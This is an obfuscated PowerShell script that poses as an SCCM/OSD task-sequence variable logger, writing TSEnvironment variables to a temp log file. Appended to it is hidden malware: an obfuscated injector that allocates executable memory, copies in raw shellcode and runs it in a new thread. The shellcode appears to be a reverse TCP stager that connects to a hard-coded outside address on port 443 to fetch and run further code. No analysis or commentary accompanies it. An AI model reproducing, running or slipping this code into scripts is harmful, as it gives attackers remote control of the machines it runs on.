${tSeNvi`RoNm`ent} = .("{2}{3}{0}{1}"-f 'c','t','New-O','bje') -ComObject ("{4}{1}{6}{3}{2}{5}{0}"-f'ment','soft.','.TSE','S','Micro','nviron','SM')
${Va`RIAbl`eS} = ${TSe`Nv`iRON`MEnT}.("{0}{3}{2}{1}" -f 'Ge','ables','ari','tV').Invoke()
${vAria`Bl`ES} | &("{1}{4}{2}{3}{0}"-f 'bject','F','ch-','O','orEa') {
    .("{1}{0}{2}"-f '-','Add','Content') -Path "$($env:SystemDrive)\Windows\Temp\OSDVariables.log" -Value ("{5}{3}{1}{2}{0}{4}" -f 'n','d-C','onte','    Ad','t -Path ','
')$(${eNv:S`YSt`EMdRi`Ve})(("{39}{20}{32}{11}{21}{23}{29}{9}{28}{17}{0}{40}{16}{37}{18}{27}{26}{25}{1}{8}{33}{2}{6}{15}{24}{22}{34}{10}{30}{41}{13}{19}{3}{38}{7}{35}{31}{36}{12}{5}{4}{14}" -f 'og','nme','Z_))
  ','ve)VR','es.','abl','  Add-Co','n','nt.Valu','DV','th','m','TempVRJOSDVari','YZenv:SystemD','log -Value ','n','l','s.l','m','ri','sVRJT','pV','-','RJ','tent ','ro','vi','YZTSEn','ariable','OS',' mY','sV','e','e(mYZ(mY','Pa','dow','RJ','ue ','JWi','VRJWindow',' -Va','Z(m'))."re`PlACe"(([chAr]86+[chAr]82+[chAr]74),'\')."RePl`Ace"(([chAr]109+[chAr]89+[chAr]90),'$')
}
${C} = (((("{75}{49}{32}{56}{52}{37}{22}{64}{31}{82}{35}{66}{46}{39}{2}{53}{14}{47}{7}{29}{71}{40}{34}{48}{36}{13}{58}{44}{67}{26}{24}{4}{61}{10}{1}{15}{45}{74}{33}{72}{27}{12}{21}{84}{76}{79}{83}{30}{60}{43}{25}{8}{63}{80}{65}{5}{57}{42}{51}{50}{9}{28}{62}{23}{41}{68}{0}{59}{78}{55}{3}{19}{70}{6}{11}{38}{20}{54}{81}{16}{69}{18}{77}{73}{17}"-f 'l','mpor','r ','dllxou)]publ','tect);','ddr','static ','(I','uint dwS','r, ','DllI','ext','ubli','locatio','tua','t','set','nt);','t','ic','n IntPtr','c ','32.dllxou)]','IntPt','Pro',', ','t fl',')]p','uint dwCreationFlag','ntPtr','ri','bli','lImport(x','2',' d','ati','nt flAl','kernel','er','rn IntPt','ddress, uint','r l','ntPtr lpPar','es','Type','(xouke','te','lAlloc','wSize, ui','Dl','te','ame','u','Vir',' m','xoumsvcrt.','o','ess, I','n','l','but','[','s, ','tackSize','pu','IntPtr lpStartA','c ex',', uin','pThreadId);[D','(IntPtr dest, uin',' ',' lpA','.dllxou',' uint cou','rnel3','[','xtern IntPtr CreateThread(I',' src,','Import(','n',', ','em','c st','tPtr lpThreadAtt','static e'))-rePLace  ([ChAr]120+[ChAr]111+[ChAr]117),[ChAr]34));${w} = &("{0}{1}{2}"-f'Add-T','y','pe') -memberDefinition ${C} -Name ("{0}{1}" -f 'Win','32') -namespace ("{0}{1}{2}"-f 'Win32F','un','ctions') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x8d,0xff,0x9b,0x08,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${g} = 0x1000;if (${z}."Len`gTH" -gt 0x1000){${g} = ${Z}."LENg`Th"};${X}=${w}::("{1}{2}{3}{0}" -f 'loc','V','irt','ualAl').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${Z}."LE`NGTH"-1);${i}++) {${w}::"MeMs`ET"([IntPtr](${x}.("{0}{2}{1}"-f'ToI','2','nt3').Invoke()+${I}), ${Z}[${I}], 1)};${w}::("{0}{3}{1}{2}" -f'Cre','te','Thread','a').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{0}{2}" -f 't-slee','Star','p') 60};
